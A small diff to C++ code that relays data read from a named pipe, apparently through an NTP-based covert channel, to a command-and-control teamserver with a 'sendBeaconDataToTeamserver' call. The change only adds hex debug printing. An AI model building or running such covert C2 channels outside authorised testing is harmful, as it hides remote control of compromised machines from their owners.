@@ -271,6 +271,10 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
 		std::vector<uint8_t> vec(buffer, buffer + read);
 
+		std::cout << "Data from Pipe: ";
+		printHexVector(vec);
+		std::cout << std::endl;
+
 		//send with chunker
 		sendBeaconDataToTeamserver(
 			vec,
